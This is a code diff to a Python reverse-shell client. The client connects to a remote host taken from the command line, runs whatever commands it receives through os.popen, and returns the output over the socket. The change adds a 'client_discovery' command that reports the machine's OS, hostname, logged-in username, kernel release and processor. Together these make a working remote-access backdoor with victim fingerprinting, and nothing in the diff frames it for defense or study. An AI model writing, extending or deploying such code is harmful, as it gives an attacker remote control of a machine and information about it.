@@ -25,6 +25,8 @@ __version__ = "1.0.0"
 import os
 import socket
 import sys
+import platform
+import getpass
 
 try:
     RHOST = str(sys.argv[1])
@@ -50,9 +52,14 @@ def main():
         if cmd == 'quit':
             s.close()
             sys.exit(0)
-
-        results = os.popen(cmd).read()
-        s.sendall(results)
+        # client_discovery
+        elif cmd == 'client_discovery':
+            results = '{}|{}|{}|{}|{}'.format(platform.system(),platform.node(),getpass.getuser(),platform.release(),platform.processor())
+            s.sendall(results)
+        # any other command
+        else:
+            results = os.popen(cmd).read()
+            s.sendall(results)
 
 if __name__ == '__main__':
     main()
